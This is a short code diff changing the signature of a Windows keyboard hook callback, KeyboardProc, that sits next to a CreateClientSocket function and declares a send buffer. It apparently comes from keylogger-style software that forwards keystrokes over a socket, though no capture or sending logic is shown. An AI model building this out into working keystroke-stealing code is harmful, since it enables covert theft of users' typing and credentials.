@@ -78,7 +78,7 @@ SOCKET CreateClientSocket(const char* serverAddr, const char* port)
 	return ConnectSocket;
 }
 
-DllExport LRESULT __stdcall CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 {
 	const int BUFLEN = 512;
 	char sendBuf[BUFLEN];
